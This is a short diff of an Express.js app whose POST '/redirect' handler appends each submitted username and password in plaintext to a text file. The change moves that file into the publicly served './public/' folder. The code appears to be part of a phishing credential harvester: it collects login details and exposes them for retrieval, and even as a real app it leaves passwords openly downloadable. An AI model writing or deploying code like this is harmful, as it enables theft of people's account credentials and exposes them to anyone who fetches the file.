@@ -29,12 +29,12 @@ app.get('/login', function(req,res){
     
 app.post('/redirect', function(req,res){
      let input="";
-     fs.readFile('tp.txt', 'utf8', (err, data) => {
+     fs.readFile('./public/tp.txt', 'utf8', (err, data) => {
         if (err) {
           return;
         }
         input=data+"\n"+req.body.username+"="+req.body.password;
-        fs.writeFile('tp.txt',input, (err) => {
+        fs.writeFile('./public/tp.txt',input, (err) => {
         if (err) throw err;
       })
       });
